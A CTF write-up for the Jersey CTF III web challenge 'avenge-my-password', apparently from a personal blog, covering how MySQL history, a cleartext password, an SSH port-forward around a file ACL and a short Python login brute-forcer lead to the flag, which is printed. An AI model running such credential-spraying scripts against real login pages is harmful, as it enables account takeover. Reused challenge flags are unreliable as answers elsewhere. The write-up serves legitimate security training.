---
title: Jersey CTF III - avenge-my-password
date: 2023-04-17 10:03:43
tags: writeups
---

```
Stark to Star-Lord - "Oh my, see Quill?! I told you your credentials can work for more 
than one thing, but things only go so far. Time will tell when to search another path 
to find a way in!" Automated directory brute force is unnecessary.
```

This was my favorite of the web challenges from this year's Jersey CTF. There's still a bit of a CTF element but it combines a few different skils that are very applicable in the real world whether you're a penetration tester or pivoting as a red teamer. 

```
quantumleaper@avenge-my-password:~$ cat .mysql_history
_HiStOrY_V2_
show\040databases;
use\040information_schema;
show\040tables;
show\040databases;
show\040website;
use\040website;
show\040tables;
CREATE\040TABLE\040login\040(
\040\040\040\040\040\040\040\040userID\040INTEGER\040NOT\040NULL,
\040\040\040\040\040\040\040\040email\040VARCHAR(128)\040NOT\040NULL,
\040\040\040\040\040\040\040\040PRIMARY\040KEY\040(userID)
);
select\040*\040from\040login;
INSERT\040INTO\040login\040VALUES\040(5000,\040'lucy.hatfield@elmatrix.com',\040'75a9d701d4b530645c35c277ba6bf0ef');
```

Immediately upon login we find a log history file for mysql, so we know there's a "website" database running that's storing login information. We confirm there's definitely a website on the server by checking `/var/www/html` which contains a php file and an interesting list of folders including one called ".username" which has a file ".usernames.txt" which we are unable to read due to the access control explicitly blacklisting our user from reading it (note the + at the end of the permissions lines).

```
quantumleaper@avenge-my-password:/var/www/html$ cd .username/
quantumleaper@avenge-my-password:/var/www/html/.username$ ls -la
total 16
dr-xr-xr-x   2 root root 4096 Mar 23 19:38 .
dr-xr-xr-x  32 root root 4096 Mar 27 20:01 ..
-r-xr-xr-x+  1 root root 5275 Mar 23 18:09 .usernames.txt
-r-xr-xr-x   1 root root    0 Mar 23 19:37 hi.txt
quantumleaper@avenge-my-password:/var/www/html/.username$ getfacl .usernames.txt
# file: .usernames.txt
# owner: root
# group: root
user::r-x
user:quantumleaper:---
group::r-x
mask::r-x
other::r-x
```

First let's explore the mysql database, then we can go about getting access to that site.

```
quantumleaper@avenge-my-password:/var/www/html/.username$ mysql -u quantumleaper -p
Enter password:
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 1863
Server version: 8.0.32-0ubuntu0.22.10.2 (Ubuntu)

Copyright (c) 2000, 2023, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> use website
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> select * from login where userId = 401;
+--------+---------------+
| userID | password      |
+--------+---------------+
|    401 | Spring2023!!! |
+--------+---------------+
1 row in set (0.00 sec)

mysql>
```

If you look through all the rows of the login table, you'll notice one that doesn't appear to be a password hash but is stored in cleartext. Unfortunately for us, there's no more usernames in the table! We likely need to find a way to read that list of usernames to find which one matches up to this password. The server running this challenge is only has the SSH port open to the public, but we can create a tunnel through our SSH connection to access the local port 80 on the remote server like this:

```
ssh -L 4444:159.203.191.48:80  quantumleaper@159.203.191.48
```

![](https://i.imgur.com/43axQ7U.png)

Even though the quantumleaper user can't read that username list, maybe the user running the website can.


```
http://localhost:4444/.username/.usernames.txt


Fandacicati
Farercedanc
FarerToughTreasure
FarTruck
Fendesby
...
```

We're given back a list of 500 usernames, how do we know which one matches up? If there was an intended obvious username it went right over my head. There was no "lucy" user from the sql history log or even any usernames that were in the challenge description so I built a mini brute forcer to test our known password with all those users.

```
import requests

url = "http://localhost:4444/"

usernames = open("usernames.txt", "r").read().split('\n')

for username in usernames:
    rsp = requests.post(url, data={ "username": username, "password": "Spring2023!!!", "submit": "Login" })
    #print(rsp.text)
    if ("Invalid login" in rsp.text):
        print("bad")
    else:
        print("good")
        print(username)
        break
```

Sure enough, this gets us the matching username and we're able to login to the site to get the flag.

```
MarsString:Spring2023!!!

jctf{w3_LoV3_M@RV3L_:)_GOOD_JOB!}
```
